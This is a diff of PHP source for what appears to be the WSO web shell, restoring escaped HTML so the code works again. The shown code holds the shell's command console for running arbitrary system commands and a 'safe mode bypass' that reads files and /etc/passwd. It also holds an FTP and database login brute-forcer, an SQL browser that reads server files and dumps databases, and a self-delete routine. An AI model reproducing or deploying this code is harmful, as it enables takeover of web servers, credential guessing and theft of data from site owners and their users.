-                                                        echo '&lt;form onsubmit="g(null,null,null,null,\'1\'+this.text.value);return false;"&gt;&lt;textarea name=text class=bigarea&gt;';
+                                                        echo '<form onsubmit="g(null,null,null,null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
                                                         $fp = @fopen($_POST['p1'], 'r');
                                                         if ($fp) {
                                                             while (!@feof($fp)) echo htmlspecialchars(@fread($fp, 1024));
                                                             @fclose($fp);
                                                         }
-                                                        echo '&lt;/textarea&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
+                                                        echo '</textarea><input type=submit value=">>"></form>';
                                                         break;
                                                     case 'hexdump':
                                                         $c = @file_get_contents($_POST['p1']);
                                                         $n = 0;
-                                                        $h = array('00000000&lt;br&gt;', '', '');
+                                                        $h = array('00000000<br>', '', '');
                                                         $len = strlen($c);
-                                                        for ($i = 0;$i &lt; $len;++$i) {
+                                                        for ($i = 0;$i < $len;++$i) {
                                                             $h[1].= sprintf('%02X', ord($c[$i])) . ' ';
                                                             switch (ord($c[$i])) {
                                                                 case 0:
@@ -802,22 +802,22 @@ pre{font-family:Courier,Monospace;}
                                                             $n++;
                                                             if ($n == 32) {
                                                                 $n = 0;
-                                                                if ($i + 1 &lt; $len) {
-                                                                    $h[0].= sprintf('%08X', $i + 1) . '&lt;br&gt;';
+                                                                if ($i + 1 < $len) {
+                                                                    $h[0].= sprintf('%08X', $i + 1) . '<br>';
                                                                 }
-                                                                $h[1].= '&lt;br&gt;';
+                                                                $h[1].= '<br>';
                                                                 $h[2].= "
 ";
                                                             }
                                                         }
-                                                        echo '&lt;table cellspacing=1 cellpadding=5 bgcolor=#222222&gt;&lt;tr&gt;&lt;td bgcolor=#333333&gt;&lt;span style="font-weight: normal;"&gt;&lt;pre&gt;' . $h[0] . '&lt;/pre&gt;&lt;/span&gt;&lt;/td&gt;&lt;td bgcolor=#282828&gt;&lt;pre&gt;' . $h[1] . '&lt;/pre&gt;&lt;/td&gt;&lt;td bgcolor=#333333&gt;&lt;pre&gt;' . htmlspecialchars($h[2]) . '&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';
+                                                        echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>' . $h[0] . '</pre></span></td><td bgcolor=#282828><pre>' . $h[1] . '</pre></td><td bgcolor=#333333><pre>' . htmlspecialchars($h[2]) . '</pre></td></tr></table>';
                                                         break;
                                                     case 'rename':
                                                         if (!empty($_POST['p3'])) {
-                                                            if (!@rename($_POST['p1'], $_POST['p3'])) echo 'Can\'t rename!&lt;br&gt;';
-                                                            else die('&lt;script&gt;g(null,null,"' . urlencode($_POST['p3']) . '",null,"")&lt;/script&gt;');
+                                                            if (!@rename($_POST['p1'], $_POST['p3'])) echo 'Can\'t rename!<br>';
+                                                            else die('<script>g(null,null,"' . urlencode($_POST['p3']) . '",null,"")</script>');
                                                         }
-                                                        echo '&lt;form onsubmit="g(null,null,null,null,this.name.value);return false;"&gt;&lt;input type=text name=name value="' . htmlspecialchars($_POST['p1']) . '"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
+                                                        echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="' . htmlspecialchars($_POST['p1']) . '"><input type=submit value=">>"></form>';
                                                         break;
                                                     case 'touch':
                                                         if (!empty($_POST['p3'])) {
@@ -828,10 +828,10 @@ pre{font-family:Courier,Monospace;}
                                                             } else echo 'Bad time format!';
                                                         }
                                                         clearstatcache();
-                                                        echo '&lt;script&gt;p3_="";&lt;/script&gt;&lt;form onsubmit="g(null,null,null,null,this.touch.value);return false;"&gt;&lt;input type=text name=touch value="' . date("Y-m-d H:i:s", @filemtime($_POST['p1'])) . '"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
+                                                        echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="' . date("Y-m-d H:i:s", @filemtime($_POST['p1'])) . '"><input type=submit value=">>"></form>';
                                                         break;
                                                     }
-                                                    echo '&lt;/div&gt;';
+                                                    echo '</div>';
                                                     wsoFooter();
                                                 }
                                                 function actionSafeMode() {
@@ -860,7 +860,7 @@ pre{font-family:Courier,Monospace;}
                                                             include ($_POST['p2']);
                                                             break;
                                                         case 5:
-                                                            for (;$_POST['p2'] &lt;= $_POST['p3'];$_POST['p2']++) {
+                                                            for (;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
                                                                 $uid = @posix_getpwuid($_POST['p2']);
                                                                 if ($uid) echo join(':', $uid) . "
 ";
@@ -869,16 +869,16 @@ pre{font-family:Courier,Monospace;}
                                                         }
                                                         $temp = ob_get_clean();
                                                         wsoHeader();
-                                                        echo '&lt;h1&gt;Safe mode bypass&lt;/h1&gt;&lt;div class=content&gt;';
-                                                        echo '&lt;span&gt;Copy (read file)&lt;/span&gt;&lt;form onsubmit=\'g(null,null,"1",this.param.value);return false;\'&gt;&lt;input type=text name=param&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Glob (list dir)&lt;/span&gt;&lt;form onsubmit=\'g(null,null,"2",this.param.value);return false;\'&gt;&lt;input type=text name=param&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Curl (read file)&lt;/span&gt;&lt;form onsubmit=\'g(null,null,"3",this.param.value);return false;\'&gt;&lt;input type=text name=param&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Ini_restore (read file)&lt;/span&gt;&lt;form onsubmit=\'g(null,null,"4",this.param.value);return false;\'&gt;&lt;input type=text name=param&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Posix_getpwuid ("Read" /etc/passwd)&lt;/span&gt;&lt;table&gt;&lt;form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'&gt;&lt;tr&gt;&lt;td&gt;From&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param1 value=0&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;To&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param2 value=1000&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
-                                                        if ($temp) echo '&lt;pre class="ml1" style="margin-top:5px" id="Output"&gt;' . htmlspecialchars($temp) . '&lt;/pre&gt;';
-                                                        echo '&lt;/div&gt;';
+                                                        echo '<h1>Safe mode bypass</h1><div class=content>';
+                                                        echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';
+                                                        if ($temp) echo '<pre class="ml1" style="margin-top:5px" id="Output">' . htmlspecialchars($temp) . '</pre>';
+                                                        echo '</div>';
                                                         wsoFooter();
                                                     }
                                                     function actionConsole() {
                                                         if (!empty($_POST['p1']) && !empty($_POST['p2'])) {
                                                             $_SESSION[md5($_SERVER['HTTP_HOST']) . 'stderr_to_out'] = true;
-                                                            $_POST['p1'].= ' 2&gt;&1';
+                                                            $_POST['p1'].= ' 2>&1';
                                                         } elseif (!empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'stderr_to_out'] = false;
                                                         if (isset($_POST['ajax'])) {
                                                             $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = true;
@@ -904,7 +904,7 @@ $ " . $_POST['p1'] . "
                                                             exit;
                                                         }
                                                         wsoHeader();
-                                                        echo "&lt;script&gt;
+                                                        echo "<script>
 if(window.Event) window.captureEvents(Event.KEYDOWN);
 var cmds = new Array('');
 var cur = 0;
@@ -912,13 +912,13 @@ function kp(e) {
 	var n = (window.Event) ? e.which : e.keyCode;
 	if(n == 38) {
 		cur--;
-		if(cur&gt;=0)
+		if(cur>=0)
 			document.cf.cmd.value = cmds[cur];
 		else
 			cur++;
 	} else if(n == 40) {
 		cur++;
-		if(cur &lt; cmds.length)
+		if(cur < cmds.length)
 			document.cf.cmd.value = cmds[cur];
 		else
 			cur--;
@@ -930,23 +930,23 @@ function add(cmd) {
 	cmds.push('');
 	cur = cmds.length-1;
 }
-&lt;/script&gt;";
-                                                        echo '&lt;h1&gt;Console&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"&gt;&lt;select name=alias&gt;';
-                                                        foreach ($GLOBALS['aliases'] as $n =&gt; $v) {
+</script>";
+                                                        echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><select name=alias>';
+                                                        foreach ($GLOBALS['aliases'] as $n => $v) {
                                                             if ($v == '') {
-                                                                echo '&lt;optgroup label="-' . htmlspecialchars($n) . '-"&gt;&lt;/optgroup&gt;';
+                                                                echo '<optgroup label="-' . htmlspecialchars($n) . '-"></optgroup>';
                                                                 continue;
                                                             }
-                                                            echo '&lt;option value="' . htmlspecialchars($v) . '"&gt;' . $n . '&lt;/option&gt;';
+                                                            echo '<option value="' . htmlspecialchars($v) . '">' . $n . '</option>';
                                                         }
                                                         if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
-                                                        echo '&lt;/select&gt;&lt;input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="&gt;&gt;"&gt; &lt;nobr&gt;&lt;input type=checkbox name=ajax value=1 ' . (@$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '&gt; send using AJAX &lt;input type=checkbox name=show_errors value=1 ' . (!empty($_POST['p2']) || $_SESSION[md5($_SERVER['HTTP_HOST']) . 'stderr_to_out'] ? 'checked' : '') . '&gt; redirect stderr to stdout (2&gt;&1)&lt;/nobr&gt;&lt;br/&gt;&lt;textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly&gt;';
+                                                        echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 ' . (@$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX <input type=checkbox name=show_errors value=1 ' . (!empty($_POST['p2']) || $_SESSION[md5($_SERVER['HTTP_HOST']) . 'stderr_to_out'] ? 'checked' : '') . '> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
                                                         if (!empty($_POST['p1'])) {
                                                             echo htmlspecialchars("$ " . $_POST['p1'] . "
 " . wsoEx($_POST['p1']));
                                                         }
-                                                        echo '&lt;/textarea&gt;&lt;table style="border:1px solid #df5;background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"&gt;&lt;tr&gt;&lt;td width="1%"&gt;$&lt;/td&gt;&lt;td&gt;&lt;input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';
-                                                        echo '&lt;/form&gt;&lt;/div&gt;&lt;script&gt;d.cf.cmd.focus();&lt;/script&gt;';
+                                                        echo '</textarea><table style="border:1px solid #df5;background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
+                                                        echo '</form></div><script>d.cf.cmd.focus();</script>';
                                                         wsoFooter();
                                                     }
                                                     function actionLogout() {
@@ -957,13 +957,13 @@ function add(cmd) {
                                                         if ($_POST['p1'] == 'yes') if (@unlink(preg_replace('!\(\d+\)\s.*!', '', 'index.php'))) die('Shell has been removed');
                                                         else echo 'unlink error!';
                                                         if ($_POST['p1'] != 'yes') wsoHeader();
-                                                        echo '&lt;h1&gt;Suicide&lt;/h1&gt;&lt;div class=content&gt;Really want to remove the shell?&lt;br&gt;&lt;a href=# onclick="g(null,null,\'yes\')"&gt;Yes&lt;/a&gt;&lt;/div&gt;';
+                                                        echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
                                                         wsoFooter();
                                                     }
                                                     function actionBruteforce() {
                                                         wsoHeader();
                                                         if (isset($_POST['proto'])) {
-                                                            echo '&lt;h1&gt;Results&lt;/h1&gt;&lt;div class=content&gt;&lt;span&gt;Type:&lt;/span&gt; ' . htmlspecialchars($_POST['proto']) . ' &lt;span&gt;Server:&lt;/span&gt; ' . htmlspecialchars($_POST['server']) . '&lt;br&gt;';
+                                                            echo '<h1>Results</h1><div class=content><span>Type:</span> ' . htmlspecialchars($_POST['proto']) . ' <span>Server:</span> ' . htmlspecialchars($_POST['server']) . '<br>';
                                                             if ($_POST['proto'] == 'ftp') {
                                                                 function bruteForce($ip, $port, $login, $pass) {
                                                                     $fp = @ftp_connect($ip, $port ? $port : 21);
@@ -996,15 +996,15 @@ function add(cmd) {
                                                                     ++$attempts;
                                                                     if (bruteForce(@$server[0], @$server[1], $line[0], $line[0])) {
                                                                         $success++;
-                                                                        echo '&lt;b&gt;' . htmlspecialchars($line[0]) . '&lt;/b&gt;:' . htmlspecialchars($line[0]) . '&lt;br&gt;';
+                                                                        echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($line[0]) . '<br>';
                                                                     }
                                                                     if (@$_POST['reverse']) {
                                                                         $tmp = "";
-                                                                        for ($i = strlen($line[0]) - 1;$i &gt;= 0;--$i) $tmp.= $line[0][$i];
+                                                                        for ($i = strlen($line[0]) - 1;$i >= 0;--$i) $tmp.= $line[0][$i];
                                                                         ++$attempts;
                                                                         if (bruteForce(@$server[0], @$server[1], $line[0], $tmp)) {
                                                                             $success++;
-                                                                            echo '&lt;b&gt;' . htmlspecialchars($line[0]) . '&lt;/b&gt;:' . htmlspecialchars($tmp);
+                                                                            echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($tmp);
                                                                         }
                                                                     }
                                                                 }
@@ -1015,14 +1015,14 @@ function add(cmd) {
                                                                     ++$attempts;
                                                                     if (bruteForce($server[0], @$server[1], $_POST['login'], $line)) {
                                                                         $success++;
-                                                                        echo '&lt;b&gt;' . htmlspecialchars($_POST['login']) . '&lt;/b&gt;:' . htmlspecialchars($line) . '&lt;br&gt;';
+                                                                        echo '<b>' . htmlspecialchars($_POST['login']) . '</b>:' . htmlspecialchars($line) . '<br>';
                                                                     }
                                                                 }
                                                             }
-                                                            echo "&lt;span&gt;Attempts:&lt;/span&gt; $attempts &lt;span&gt;Success:&lt;/span&gt; $success&lt;/div&gt;&lt;br&gt;";
+                                                            echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
                                                         }
-                                                        echo '&lt;h1&gt;FTP bruteforce&lt;/h1&gt;&lt;div class=content&gt;&lt;table&gt;&lt;form method=post&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Type&lt;/span&gt;&lt;/td&gt;' . '&lt;td&gt;&lt;select name=proto&gt;&lt;option value=ftp&gt;FTP&lt;/option&gt;&lt;option value=mysql&gt;MySql&lt;/option&gt;&lt;option value=pgsql&gt;PostgreSql&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;' . '&lt;input type=hidden name=c value="' . htmlspecialchars($GLOBALS['cwd']) . '"&gt;' . '&lt;input type=hidden name=a value="' . htmlspecialchars($_POST['a']) . '"&gt;' . '&lt;input type=hidden name=charset value="' . htmlspecialchars($_POST['charset']) . '"&gt;' . '&lt;span&gt;Server:port&lt;/span&gt;&lt;/td&gt;' . '&lt;td&gt;&lt;input type=text name=server value="127.0.0.1"&gt;&lt;/td&gt;&lt;/tr&gt;' . '&lt;tr&gt;&lt;td&gt;&lt;span&gt;Brute type&lt;/span&gt;&lt;/td&gt;' . '&lt;td&gt;&lt;label&gt;&lt;input type=radio name=type value="1" checked&gt; /etc/passwd&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;' . '&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;label style="padding-left:15px"&gt;&lt;input type=checkbox name=reverse value=1 checked&gt; reverse (login -&gt; nigol)&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;' . '&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;label&gt;&lt;input type=radio name=type value="2"&gt; Dictionary&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;' . '&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;table style="padding-left:15px"&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Login&lt;/span&gt;&lt;/td&gt;' . '&lt;td&gt;&lt;input type=text name=login value="root"&gt;&lt;/td&gt;&lt;/tr&gt;' . '&lt;tr&gt;&lt;td&gt;&lt;span&gt;Dictionary&lt;/span&gt;&lt;/td&gt;' . '&lt;td&gt;&lt;input type=text name=dict value="' . htmlspecialchars($GLOBALS['cwd']) . 'passwd.dic"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;' . '&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;';
-                                                        echo '&lt;/div&gt;&lt;br&gt;';
+                                                        echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>' . '<input type=hidden name=c value="' . htmlspecialchars($GLOBALS['cwd']) . '">' . '<input type=hidden name=a value="' . htmlspecialchars($_POST['a']) . '">' . '<input type=hidden name=charset value="' . htmlspecialchars($_POST['charset']) . '">' . '<span>Server:port</span></td>' . '<td><input type=text name=server value="127.0.0.1"></td></tr>' . '<tr><td><span>Brute type</span></td>' . '<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>' . '<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>' . '<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>' . '<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>' . '<td><input type=text name=login value="root"></td></tr>' . '<tr><td><span>Dictionary</span></td>' . '<td><input type=text name=dict value="' . htmlspecialchars($GLOBALS['cwd']) . 'passwd.dic"></td></tr></table>' . '</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>';
+                                                        echo '</div><br>';
                                                         wsoFooter();
                                                     }
                                                     function actionSql() {
@@ -1031,23 +1031,23 @@ function add(cmd) {
                                                             var $link;
                                                             var $res;
                                                             function DbClass($type) {
-                                                                $this-&gt;type = $type;
+                                                                $this->type = $type;
                                                             }
                                                             function connect($host, $user, $pass, $dbname) {
-                                                                switch ($this-&gt;type) {
+                                                                switch ($this->type) {
                                                                     case 'mysql':
-                                                                        if ($this-&gt;link = @mysql_connect($host, $user, $pass, true)) return true;
+                                                                        if ($this->link = @mysql_connect($host, $user, $pass, true)) return true;
                                                                         break;
                                                                     case 'pgsql':
                                                                         $host = explode(':', $host);
                                                                         if (!$host[1]) $host[1] = 5432;
-                                                                        if ($this-&gt;link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname")) return true;
+                                                                        if ($this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname")) return true;
                                                                         break;
                                                                     }
                                                                     return false;
                                                                 }
                                                                 function selectdb($db) {
-                                                                    switch ($this-&gt;type) {
+                                                                    switch ($this->type) {
                                                                         case 'mysql':
                                                                             if (@mysql_select_db($db)) return true;
                                                                             break;
@@ -1055,19 +1055,19 @@ function add(cmd) {
                                                                         return false;
                                                                 }
                                                                 function query($str) {
-                                                                    switch ($this-&gt;type) {
+                                                                    switch ($this->type) {
                                                                         case 'mysql':
-                                                                            return $this-&gt;res = @mysql_query($str);
+                                                                            return $this->res = @mysql_query($str);
                                                                         break;
                                                                         case 'pgsql':
-                                                                            return $this-&gt;res = @pg_query($this-&gt;link, $str);
+                                                                            return $this->res = @pg_query($this->link, $str);
                                                                         break;
                                                                     }
                                                                     return false;
                                                                 }
                                                                 function fetch() {
-                                                                    $res = func_num_args() ? func_get_arg(0) : $this-&gt;res;
-                                                                    switch ($this-&gt;type) {
+                                                                    $res = func_num_args() ? func_get_arg(0) : $this->res;
+                                                                    switch ($this->type) {
                                                                         case 'mysql':
                                                                             return @mysql_fetch_assoc($res);
                                                                         break;
@@ -1078,29 +1078,29 @@ function add(cmd) {
                                                                     return false;
                                                                 }
                                                                 function listDbs() {
-                                                                    switch ($this-&gt;type) {
+                                                                    switch ($this->type) {
                                                                         case 'mysql':
-                                                                            return $this-&gt;query("SHOW databases");
+                                                                            return $this->query("SHOW databases");
                                                                         break;
                                                                         case 'pgsql':
-                                                                            return $this-&gt;res = $this-&gt;query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
+                                                                            return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
                                                                         break;
                                                                     }
                                                                     return false;
                                                                 }
                                                                 function listTables() {
-                                                                    switch ($this-&gt;type) {
+                                                                    switch ($this->type) {
                                                                         case 'mysql':
-                                                                            return $this-&gt;res = $this-&gt;query('SHOW TABLES');
+                                                                            return $this->res = $this->query('SHOW TABLES');
                                                                         break;
                                                                         case 'pgsql':
-                                                                            return $this-&gt;res = $this-&gt;query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
+                                                                            return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
                                                                         break;
                                                                     }
                                                                     return false;
                                                                 }
                                                                 function error() {
-                                                                    switch ($this-&gt;type) {
+                                                                    switch ($this->type) {
                                                                         case 'mysql':
                                                                             return @mysql_error();
                                                                         break;
@@ -1111,47 +1111,47 @@ function add(cmd) {
                                                                     return false;
                                                                 }
                                                                 function setCharset($str) {
-                                                                    switch ($this-&gt;type) {
+                                                                    switch ($this->type) {
                                                                         case 'mysql':
-                                                                            if (function_exists('mysql_set_charset')) return @mysql_set_charset($str, $this-&gt;link);
-                                                                            else $this-&gt;query('SET CHARSET ' . $str);
+                                                                            if (function_exists('mysql_set_charset')) return @mysql_set_charset($str, $this->link);
+                                                                            else $this->query('SET CHARSET ' . $str);
                                                                             break;
                                                                         case 'pgsql':
-                                                                            return @pg_set_client_encoding($this-&gt;link, $str);
+                                                                            return @pg_set_client_encoding($this->link, $str);
                                                                             break;
                                                                         }
                                                                         return false;
                                                                     }
                                                                     function loadFile($str) {
-                                                                        switch ($this-&gt;type) {
+                                                                        switch ($this->type) {
                                                                             case 'mysql':
-                                                                                return $this-&gt;fetch($this-&gt;query("SELECT LOAD_FILE('" . addslashes($str) . "') as file"));
+                                                                                return $this->fetch($this->query("SELECT LOAD_FILE('" . addslashes($str) . "') as file"));
                                                                             break;
                                                                             case 'pgsql':
-                                                                                $this-&gt;query("CREATE TABLE wso2(file text);COPY wso2 FROM '" . addslashes($str) . "';select file from wso2;");
+                                                                                $this->query("CREATE TABLE wso2(file text);COPY wso2 FROM '" . addslashes($str) . "';select file from wso2;");
                                                                                 $r = array();
-                                                                                while ($i = $this-&gt;fetch()) $r[] = $i['file'];
-                                                                                $this-&gt;query('drop table wso2');
-                                                                                return array('file' =&gt; implode("
+                                                                                while ($i = $this->fetch()) $r[] = $i['file'];
+                                                                                $this->query('drop table wso2');
+                                                                                return array('file' => implode("
 ", $r));
                                                                                 break;
                                                                             }
                                                                             return false;
                                                                     }
                                                                     function dump($table, $fp = false) {
-                                                                        switch ($this-&gt;type) {
+                                                                        switch ($this->type) {
                                                                             case 'mysql':
-                                                                                $res = $this-&gt;query('SHOW CREATE TABLE `' . $table . '`');
+                                                                                $res = $this->query('SHOW CREATE TABLE `' . $table . '`');
                                                                                 $create = mysql_fetch_array($res);
                                                                                 $sql = $create[1] . ";
 ";
                                                                                 if ($fp) fwrite($fp, $sql);
                                                                                 else echo ($sql);
-                                                                                $this-&gt;query('SELECT * FROM `' . $table . '`');
+                                                                                $this->query('SELECT * FROM `' . $table . '`');
                                                                                 $head = true;
-                                                                                while ($item = $this-&gt;fetch()) {
+                                                                                while ($item = $this->fetch()) {
                                                                                     $columns = array();
-                                                                                    foreach ($item as $k =&gt; $v) {
+                                                                                    foreach ($item as $k => $v) {
                                                                                         if ($v == null) $item[$k] = "NULL";
                                                                                         elseif (is_numeric($v)) $item[$k] = $v;
                                                                                         else $item[$k] = "'" . @mysql_real_escape_string($v) . "'";
@@ -1174,10 +1174,10 @@ function add(cmd) {
 ");
                                                                                 break;
                                                                             case 'pgsql':
-                                                                                $this-&gt;query('SELECT * FROM ' . $table);
-                                                                                while ($item = $this-&gt;fetch()) {
+                                                                                $this->query('SELECT * FROM ' . $table);
+                                                                                while ($item = $this->fetch()) {
                                                                                     $columns = array();
-                                                                                    foreach ($item as $k =&gt; $v) {
+                                                                                    foreach ($item as $k => $v) {
                                                                                         $item[$k] = "'" . addslashes($v) . "'";
                                                                                         $columns[] = $k;
                                                                                     }
@@ -1193,86 +1193,86 @@ function add(cmd) {
                                                                     };
                                                                     $db = new DbClass($_POST['type']);
                                                                     if (@$_POST['p2'] == 'download') {
-                                                                        $db-&gt;connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
-                                                                        $db-&gt;selectdb($_POST['sql_base']);
+                                                                        $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
+                                                                        $db->selectdb($_POST['sql_base']);
                                                                         switch ($_POST['charset']) {
                                                                             case "Windows-1251":
-                                                                                $db-&gt;setCharset('cp1251');
+                                                                                $db->setCharset('cp1251');
                                                                             break;
                                                                             case "UTF-8":
-                                                                                $db-&gt;setCharset('utf8');
+                                                                                $db->setCharset('utf8');
                                                                             break;
                                                                             case "KOI8-R":
-                                                                                $db-&gt;setCharset('koi8r');
+                                                                                $db->setCharset('koi8r');
                                                                             break;
                                                                             case "KOI8-U":
-                                                                                $db-&gt;setCharset('koi8u');
+                                                                                $db->setCharset('koi8u');
                                                                             break;
                                                                             case "cp866":
-                                                                                $db-&gt;setCharset('cp866');
+                                                                                $db->setCharset('cp866');
                                                                             break;
                                                                         }
                                                                         if (empty($_POST['file'])) {
                                                                             ob_start("ob_gzhandler", 4096);
                                                                             header("Content-Disposition: attachment; filename=dump.sql");
                                                                             header("Content-Type: text/plain");
-                                                                            foreach ($_POST['tbl'] as $v) $db-&gt;dump($v);
+                                                                            foreach ($_POST['tbl'] as $v) $db->dump($v);
                                                                             exit;
                                                                         } elseif ($fp = @fopen($_POST['file'], 'w')) {
-                                                                            foreach ($_POST['tbl'] as $v) $db-&gt;dump($v, $fp);
+                                                                            foreach ($_POST['tbl'] as $v) $db->dump($v, $fp);
                                                                             fclose($fp);
                                                                             unset($_POST['p2']);
-                                                                        } else die('&lt;script&gt;alert("Error! Can\'t open file");window.history.back(-1)&lt;/script&gt;');
+                                                                        } else die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
                                                                     }
                                                                     wsoHeader();
                                                                     echo "
-&lt;h1&gt;Sql browser&lt;/h1&gt;&lt;div class=content&gt;
-&lt;form name='sf' method='post' onsubmit='fs(this);'&gt;&lt;table cellpadding='2' cellspacing='0'&gt;&lt;tr&gt;
-&lt;td&gt;Type&lt;/td&gt;&lt;td&gt;Host&lt;/td&gt;&lt;td&gt;Login&lt;/td&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;Database&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
